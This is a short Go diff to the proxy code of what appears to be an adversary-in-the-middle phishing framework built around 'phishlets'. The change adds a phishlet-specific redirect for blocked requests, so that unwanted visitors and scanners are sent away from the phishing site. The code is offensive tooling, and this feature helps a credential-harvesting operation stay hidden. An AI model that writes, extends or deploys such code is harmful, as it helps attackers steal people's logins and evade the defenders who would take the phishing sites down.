@@ -1033,8 +1033,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
+	// Check if a general redirect URL is provided
 	if len(p.cfg.general.RedirectUrl) > 0 {
 		redirect_url := p.cfg.general.RedirectUrl
+		pl := p.getPhishletByPhishHost(req.Host)
+		// Check if a phishlet-specific redirect URL is available for the current request's host
+		phishlet_redirect_url := pl.redirect_url
+		// Overwrite general redirect URL if phishlet-specific URL is available
+		if len(phishlet_redirect_url) > 0 {
+			log.Info("phishlet redirect override for [%s]", pl.Name)
+			redirect_url = phishlet_redirect_url
+		}
+
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		if resp != nil {
 			resp.Header.Add("Location", redirect_url)
